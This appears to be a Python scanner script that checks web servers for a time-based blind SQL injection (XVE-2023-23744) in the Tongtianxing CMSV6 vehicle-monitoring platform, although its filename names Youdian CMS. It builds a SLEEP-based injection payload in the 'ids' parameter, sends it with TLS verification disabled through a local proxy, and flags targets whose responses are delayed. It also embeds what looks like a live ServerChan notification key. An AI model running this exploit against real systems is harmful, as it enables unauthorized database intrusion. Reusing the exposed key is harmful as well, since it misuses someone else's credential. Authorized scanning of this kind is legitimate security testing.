# Youdian_CMS_GetSpecial_SQL_vul_scan.py
#通天星CMSV6车载定位监控平台 SQL注入漏洞
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_XVE_2023_23744(url, proxies, headers, append_to_output):
    if url.endswith("/"):
        path = "run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1"
    else:
        path = "/run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&loadAll=1"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    base_url = url + path
    #relative_path = "../appManage/getApp"
    #full_url = base_url + relative_path
    full_url = base_url

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
    }

    encodetext = url + path

    try:
        expected_time = 5  # 期望的回包时间，单位为秒
        start_time = time.time()
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(encodetext, headers=headers, verify=False, timeout=10, proxies=proxies)
        res = req.text
        end_time = time.time()

        response_time = end_time - start_time
        if response_time >= expected_time and req.status_code == 200:
            append_to_output(f"[+] {url} 存在通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)！！！！", "red")
            # self.append_to_output(res, "yellow")
        else:
            append_to_output(f"[-] {url} 不存在通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
